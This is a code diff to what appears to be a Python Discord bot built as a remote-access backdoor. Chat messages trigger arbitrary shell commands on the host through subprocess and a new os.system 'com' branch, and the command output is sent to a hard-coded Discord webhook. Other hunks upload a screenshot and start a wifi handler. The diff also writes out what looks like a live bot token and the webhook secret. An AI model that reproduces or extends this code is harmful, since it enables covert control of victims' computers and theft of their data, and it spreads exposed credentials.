@@ -7,7 +7,7 @@ import datetime
 import time
 
 
-TOKEN = ""
+TOKEN = "MTE5NTMzMTE1NzEwNjEwMjMzNA.G9IMv5.gaZq6AofRr_kZOgtv5GojC5HnFA3niGjFaM4s0"
 
 intents = discord.Intents.default()
 intents.message_content = True
@@ -29,14 +29,19 @@ async def on_message(message):
         command = message.content
         command = command.replace('command ', '')
         # os.system(command)
-        hmm = subprocess.run(command, capture_output=True, text=True, shell=True)
-        webhook = DiscordWebhook(url="https://discord.com/api/webhooks/1195633509755265055/PkPWgyJEy9nRZrxcWTMwR88AWjf6X9WoOzo1FC5kSevKrJtMWbOrsZDAA_qWCH79x0dF", content=hmm.stdout)
+        hmm = subprocess.check_output(command,stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8')
+        webhook = DiscordWebhook(url="https://discord.com/api/webhooks/1195633509755265055/PkPWgyJEy9nRZrxcWTMwR88AWjf6X9WoOzo1FC5kSevKrJtMWbOrsZDAA_qWCH79x0dF", content=hmm)
         response = webhook.execute()
-        out = hmm.stdout
+        out = hmm
         out = out.replace('Ã', '├')
         out = out.replace('Ä', '─')
         print(out)
-        
+    
+    elif message.content.startswith('com'):
+        await message.channel.send('Sent command!')
+        command = message.content
+        command = command.replace('com ', '')
+        os.system(command)
         
         
         
@@ -51,15 +56,7 @@ async def on_message(message):
             webhook.add_file(file=f.read(), filename="help.png")
         response = webhook.execute()
         os.remove("./help.png")
-        
-        
-        
-        
-        
-        
-        
-        
-        
+
         
     elif message.content.startswith('wifi'):
         networks, out = [], ''
